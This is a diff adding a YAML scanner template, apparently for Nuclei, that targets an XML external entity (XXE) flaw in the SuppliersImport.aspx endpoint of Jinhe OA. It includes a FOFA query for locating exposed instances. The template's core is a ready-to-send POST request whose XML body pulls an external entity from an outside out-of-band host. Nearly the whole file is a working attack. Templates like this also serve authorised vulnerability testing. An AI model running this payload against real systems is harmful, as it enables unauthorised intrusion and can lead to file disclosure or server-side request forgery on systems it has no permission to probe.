@@ -1,0 +1,32 @@
+id: poc-ilt38gtepklg0myo
+info:
+  name: 金和OA SuppliersImport.aspx 存在XXE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ilt38gtepklg0myo'
+  tags: xxe,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ilt38gtepklg0myo
+    fofa: app="金和网络-金和OA"
+http:
+- raw:
+  - 'POST /c6/JHSoft.Web.ContractManagement/Importing/SuppliersImport.aspx/ HTTP/1.1
+
+    Host: {{Hostname}}
+
+
+    <?xml version="1.0" encoding="UTF-8"?>
+
+    <!DOCTYPE root [
+
+    <!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
+
+    %remote;]>
+
+    <root/>'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
